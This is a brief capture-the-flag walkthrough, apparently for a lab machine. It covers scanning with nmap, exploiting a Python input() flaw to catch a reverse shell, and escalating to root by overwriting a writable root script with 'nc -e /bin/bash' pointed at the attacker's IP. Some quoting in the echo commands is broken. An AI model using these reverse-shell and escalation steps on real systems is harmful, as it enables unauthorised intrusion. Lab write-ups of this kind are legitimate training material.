After scan with nmap , machine has 2 port 22 and 10000
using " nc 10.10.226.122 10000" we know that the server run on python
so we should exploit bypass input() func 
read this post : https://intx0x80.blogspot.com/2017/05/python-input-vulnerability_25.html
so we wil creat a revershell 
nc -lvnp 1234
python3 exploit.py

=> we connect to machine
python3 -c 'import pty; pty.spawn("/bin/bash")'
1 . cat user.txt we have 1 flag
2 . GET ROOT 
using ls -al
we see file 
1. root.sh is root's file but it in home directory so even we don't have write permission we still excute it
first remove this file " rm root.sh "
echo ' #!/bin/bash#' > root.sh 
echo 'nc -e /bin/bash 10.9.233.44 1235" >> root.sh
chmod +x root.sh
so we full permision with root.sh
open new terminal and type "nc -lvnp 1235"
./root.sh
so we become root
cat /root/root.txt
